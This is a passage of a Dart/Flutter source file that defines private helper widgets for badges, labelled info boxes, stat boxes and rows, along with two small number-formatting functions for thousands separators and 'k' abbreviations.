      child: Text(label, style: TextStyle(color: c, fontSize: 10, fontWeight: FontWeight.bold, letterSpacing: 1.5)),
    ),
  );

  Widget _badge(String text, Color c) => Container(
    padding: const EdgeInsets.symmetric(horizontal: 7, vertical: 2),
    decoration: BoxDecoration(color: c.withOpacity(0.08), borderRadius: BorderRadius.circular(2), border: Border.all(color: c.withOpacity(0.2))),
    child: Text(text, style: TextStyle(fontSize: 8, color: c, letterSpacing: 1)),
  );

  Widget _ibox(String label, String val, Color c) => Container(
    padding: const EdgeInsets.all(7),
    decoration: BoxDecoration(color: cBg, borderRadius: BorderRadius.circular(3), border: Border.all(color: cBr)),
    child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
      Text(label, style: const TextStyle(fontSize: 9, color: cDg)),
      const SizedBox(height: 2),
      Text(val, style: TextStyle(fontSize: 11, color: c)),
    ]),
  );

  Widget _pbox(String icon, String val, String label, Color c) => Container(
    padding: const EdgeInsets.all(7),
    decoration: BoxDecoration(color: cBg, borderRadius: BorderRadius.circular(4), border: Border.all(color: cBr)),
    child: Column(children: [
      Text(_fn(int.tryParse(val) ?? 0), style: TextStyle(fontSize: 16, fontWeight: FontWeight.bold,
        color: c, shadows: [Shadow(color: c, blurRadius: 10)], fontFamily: 'monospace')),
      Text(label, style: const TextStyle(fontSize: 8, color: cDg, letterSpacing: 1)),
    ]),
  );

  Widget _prow(String label, String val) => Padding(
    padding: const EdgeInsets.symmetric(vertical: 6),
    child: Row(mainAxisAlignment: MainAxisAlignment.spaceBetween, children: [
      Text(label, style: const TextStyle(fontSize: 10, color: cDg, letterSpacing: 1)),
      Text(val, style: const TextStyle(fontSize: 10, color: cG)),
    ]),
  );

  String _fmt(int n) {
    final s = n.toString();
    final buf = StringBuffer();
    for (var i = 0; i < s.length; i++) {
      if (i > 0 && (s.length - i) % 3 == 0) buf.write(',');
      buf.write(s[i]);
    }
    return buf.toString();
  }

  String _fn(int n) => n >= 1000 ? '${(n/1000).toStringAsFixed(1)}k' : '$n';
}
